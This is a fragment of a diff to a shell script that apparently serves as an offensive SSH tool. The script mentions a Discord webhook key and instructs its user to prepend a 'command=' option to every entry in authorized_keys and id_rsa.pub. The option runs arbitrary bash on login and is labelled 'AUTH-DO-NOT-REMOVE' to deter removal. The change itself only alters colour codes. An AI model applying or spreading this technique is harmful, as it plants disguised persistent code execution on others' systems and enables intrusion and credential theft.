@@ -71,5 +71,5 @@ Set your own DISCORD WEBHOOK KEY:
 
 out -e "${CDY}Prepend this to every line in ${CY}~/.ssh/authorized_keys${CDY}
 and ${CY}~/.ssh/id_rsa.pub${CDY} so that it looks like this${CN}:"
-echo -en "${CDM}command=\"\`###---AUTH-DO-NOT-REMOVE---\`;bash -c '{ ${cmd}}'\"${CN}"
+echo -en "${CM}command=${CM}\"${CDM}\`###---AUTH-DO-NOT-REMOVE---\`;bash -c '{ ${cmd}}'${CM}\"${CN}"
 out " ssh-rsa blahblah..original..key..here"
